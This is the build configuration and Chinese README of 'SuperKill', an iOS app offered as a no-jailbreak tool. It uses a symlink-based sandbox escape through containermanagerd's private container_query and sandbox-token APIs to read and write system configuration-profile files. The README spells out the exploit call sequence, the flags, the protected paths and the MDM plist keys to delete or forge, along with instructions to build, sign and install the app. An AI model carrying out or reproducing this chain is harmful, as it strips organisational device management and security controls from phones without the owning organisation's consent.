TARGET := iphone:clang:latest:17.0
ARCHS := arm64 arm64e

include $(THEOS)/makefiles/common.mk

APPLICATION_NAME := SuperKill

SuperKill_FILES := $(wildcard Sources/*.m)
SuperKill_FRAMEWORKS := Foundation UIKit Security
SuperKill_CODESIGN_FLAGS := -SEntitlements/SuperKill.entitlements
SuperKill_INFOPLIST := Resources/Info.plist

include $(THEOS_MAKE_PATH)/application.mk

after-install::
	install.exec "killall -9 SuperKill || true"

name: SuperKill
options:
  bundleIdPrefix: cc.replace
  createIntermediateGroups: true
  deploymentTarget:
    iOS: "17.0"

settings:
  base:
    IPHONEOS_DEPLOYMENT_TARGET: "17.0"
    CLANG_ENABLE_OBJC_ARC: YES
    GENERATE_INFOPLIST_FILE: NO
    SWIFT_VERSION: "5.0"
    # 默认 App Group；出包时可用 SK_APP_GROUP=... 覆盖
    SK_APP_GROUP: group.cc.replace.superkill

targets:
  SuperKill:
    type: application
    platform: iOS
    sources:
      - path: Sources
    settings:
      base:
        PRODUCT_NAME: SuperKill
        PRODUCT_BUNDLE_IDENTIFIER: cc.replace.superkill
        INFOPLIST_FILE: Resources/Info.plist
        CODE_SIGN_ENTITLEMENTS: Entitlements/SuperKill.entitlements
        CODE_SIGN_STYLE: Automatic
        DEVELOPMENT_TEAM: ""
        TARGETED_DEVICE_FAMILY: "1,2"
        OTHER_LDFLAGS: "-framework Foundation -framework UIKit -framework Security"
    scheme:
      gatherCoverageData: false

# SuperKill

基于 [`forcequitOS/worse_query`](https://github.com/forcequitOS/worse_query) 沙盒逃逸原语的 iOS **监管（Supervision）状态读写**工具：既能**清除**监管，也能**写入**监管（测试用），可直接编译成 IPA。

- 目标系统：**iOS 26.0 – 26.7.2 / 27.2**（原语的生效窗口），不需要越狱
- 原理：`containermanagerd` 在签发 App Group 的 sandbox token 时会解析符号链接 → 拿到**任意路径**的读写扩展 → 改写 `systemgroup.com.apple.configurationprofiles` 里的监管数据
- 硬门槛：签名必须带 `com.apple.security.application-groups`，因此需要一个**付费 Apple Developer 账号**里注册过的 App Group
- 功能：① 自检 · ② 检测监管 · ③ 备份 · **⑧ 状态快照** · **⑦ 开启监管（测试）** · ④ 彻底清除 · ⑤ 温和补丁 · **⑨ 快照 diff** · ⑥ 回滚

---

## 0. 最短路径（Windows、没有 Mac 也能出包）

```text
① git push 到 GitHub（或 fork 一份）→ Actions → build-ipa → Run workflow
② 跑完下载 artifact: SuperKill-unsigned-ipa
③ 手机装 ESign / Feather：导入 .p12 + 含该 App Group 的 .mobileprovision，
   签名页确认 entitlements 里有 com.apple.security.application-groups，安装
④ 打开 App → 飞行模式 → ② 检测 → ③ 备份 → ④ 彻底清除（或 ⑦ 开启监管）→ 重启手机
```

有 Mac 就按第 4.1 节用 Xcode 直接跑，最省事（自动注册 App Group、自动签名）。

---

## 1. 漏洞链（worse_query 到底做了什么）

```
① 你的 App 有一个 App Group 容器：
   /private/var/mobile/Containers/Shared/AppGroup/<UUID>/
② 把该容器的 Library/Caches 删掉，换成符号链接 → 任意目标路径：
   .../Library/Caches -> /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles
③ 用 libsystem_containermanager 的私有 API 发一个 container_query：
      container_query_set_class(query, 7)                      // 7 = appGroup，必须走 XPC 到 containermanagerd
      container_query_set_group_identifiers(query, "你的group")
      container_query_operation_set_part(query, 3)             // 3 = Library/Caches
      container_query_operation_set_flags(query, 0x8000000000) // iOS 26 的 AppGroup 走 0x0800000000
      container_query_get_single_result(query)
④ containermanagerd 解析到符号链接的**真实目标**，为该路径签发 token：
      container_copy_sandbox_token(result)
⑤ 进程内 consume 掉 token：
      sandbox_extension_consume(token)   // 返回 handle > 0 即成功
⑥ 此后本进程对该路径拥有读写权限——尽管它在自己的沙盒之外。
```

关键点：`part 3` 让 containermanagerd 去算 “Library/Caches 的真实路径”，而 `class 7` 保证这次查询必须经 XPC 交给有权限的 `containermanagerd` 而不是进程内短路。符号链接是唯一的“注入点”，token 的路径授权却按解析后的目标发放——这就是 bug。

工程里的 `worse_query.m` 会自动穷举 **2 组 flags × 2 种 identifier 形态**（string / xpc array），任一组合拿到 `handle > 0` 即成功；预检查只在 `errno == ENOENT` 时判定“目标不存在”，`EPERM` 说明只是沙盒不让 stat，照样继续去签发。

`worse_query` 实测可达（原文 README）：

```
/var/containers/Data/System                         (iOS 27)
/var/containers/Shared/SystemGroup/*                (iOS 27)
/var/mobile/Containers/Data/Application/*
/var/mobile/Containers/Data/InternalDaemon/*
/var/mobile/Containers/Data/PluginKitPlugin/*
/var/mobile/Containers/Shared/AppGroup/*
```

`/var/containers/Shared/SystemGroup/*` 这一条就是本工具的全部立足点。

---

## 2. 为什么这样就等于“删除监管”

监管与 MDM 的落盘状态集中在两个系统组容器里：

| 路径 | 内容 |
|---|---|
| `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist` | `IsSupervised`、`IsMandatory`、`IsMDMUnremovable`、`OrganizationName`、`ConfigurationURL` —— 设置里“此 iPhone 受监管”就是读它 |
| 同目录 `MDM.plist` | `ServerURL` / `CheckInURL` / `Topic` / `SignMessage` / `IdentityPersistentRef`，MDM 登记本体 |
| 同目录 `MDMEvents.plist`、`MDMAppManagement.plist` | MDM 事件队列、托管 App 清单 |
| 同目录 `PayloadManifest.plist` | `OrderedProfiles`，已安装 profile 的索引 |
| 同目录 `<GUID>.stub` | 每个已安装 profile 的存根（MDM 推送的 profile 也在这里） |
| `/private/var/mobile/Library/DeviceManagement/ClientTruth.plist` 等 | DeviceManagement 框架侧的镜像状态 |
| `/private/var/mobile/Library/ConfigurationProfiles/` | 用户级 profile 存根 |

把这些清掉（或把字段降权）后重启，`profiled` 重新读盘时就没有监管记录和 MDM 登记了，设置里既没有“受监管”，也没有“VPN 与设备管理”里的 MDM 描述文件。

---

## 2.1 反向操作：开启监管（测试用）

同一个文件、同样的写权限，反过来写就是“变成监管设备”——适合验证 MDM 策略、测试受监督设备才开放的功能（如单 App 模式、强制安装、禁用抹机等）。

App 里点 **⑦ 开启监管**，会写入（`IsSupervised` 置真、其余字段按真实监管设备补齐）：

| 键 | 写入值 |
|---|---|
| `IsSupervised` | `true` |
| `IsMandatory` | `true` |
| `IsMDMUnremovable` | `1` |
| `IsMultiUser` | `false` |
| `ConfigurationWasApplied` | `true` |
| `OrganizationName` | 输入框里的值（默认 `Test Organization`） |
| `OrganizationEmail` | 输入框里的值（可空则不写） |
| `ConfigurationURL` | 输入框里的值（默认 `https://mdm.invalid/profile`） |
| `LastModifiedTime` | 当前时间 |

勾选「同时写入 MDM.plist 占位」时，额外写一份 `ServerURL` / `CheckInURL` / `Topic` / `SignMessage=false` 的占位，用来让“VPN 与设备管理”里出现条目。

写入后立即读回校验 `IsSupervised`；**重启后生效**：设置首页显示“此 iPhone 受监管 + 组织名”，② 检测显示 `IsSupervised = 1`。测试完用 ④ 彻底清除即可切回普通设备，来回切换不需要重装 App。

限制说明：

- 这只是**本机状态位**，不会真的向任何 MDM 服务器注册。真正的 MDM 登记需要 APNs 证书签署的 `Topic` 与服务器下发，伪造的 `Topic`（`com.apple.mgmt.External.test`）不会建立推送通道。
- 开启监管后，部分系统行为按受监督设备处理（例如“抹掉所有内容和设置”的入口、配置描述文件安装策略）；测试完务必清掉。
- 若重启后没有出现“受监管”字样，说明该版本还会校验 `CloudConfigurationDetails.plist` 的属主/来源（本进程以 `mobile` 写入），需要越狱环境才能伪造；App 的日志里会给出读回结果。

